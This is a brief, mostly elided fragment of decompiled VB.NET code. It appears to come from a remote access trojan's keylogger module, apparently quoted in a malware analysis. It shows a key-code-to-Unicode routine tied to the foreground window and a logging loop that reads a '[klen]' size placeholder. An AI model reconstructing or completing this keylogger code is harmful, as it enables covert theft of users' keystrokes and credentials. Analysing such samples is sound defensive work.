    ...
    Public Class kl
        ...
        Private Shared Function VKCodeToUnicode(ByVal a As UInt32) As String
            Try 
                ...
                Dim keyboardLayout As IntPtr = (kl.GetKeyboardLayout(kl.GetWindowThreadProcessId(OK.GetForegroundWindow, num3)))
        ...
        Public Sub WRK()
            ...
            Try 
                ...
                Do While True
                    ...
                    If (num = &H3E8) Then
                        num = 0
                        Dim num3 As Integer = (Conversions.ToInteger("[klen]") * &H400)
